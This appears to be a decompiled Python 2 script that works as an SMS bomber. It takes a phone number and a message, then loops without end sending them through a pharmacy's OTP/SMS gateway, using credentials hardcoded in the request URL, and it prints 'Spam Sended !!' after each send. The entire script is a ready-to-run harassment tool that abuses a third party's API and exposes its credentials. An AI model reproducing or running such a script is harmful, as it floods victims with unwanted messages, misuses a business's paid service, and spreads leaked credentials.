# Time Succses Parser : Mon Jun 15 19:56:33 2020
# Auto Parser Dis Version : 1.1.0
# Source : https://www.github.com/Datez-Kun

import requests,urllib,random
no=raw_input("No Telepon (+62) : ")
pesan=urllib.quote(raw_input("Pesan : ")+"\n\nSubscribe Justa Hacker\n\nhttps://youtube.com/rezondegrowtopia\n\n\n")
while True:
   requests.get("http://api-otp.nadyne.com/sms.php?user=apiotpfarmaku&pwd=otpfarmaku1919&sender=farmaku&msisdn={}&message={}".format(no,pesan+str(random.randint(0,99999999)))).text
   print ("Spam Sended !!")


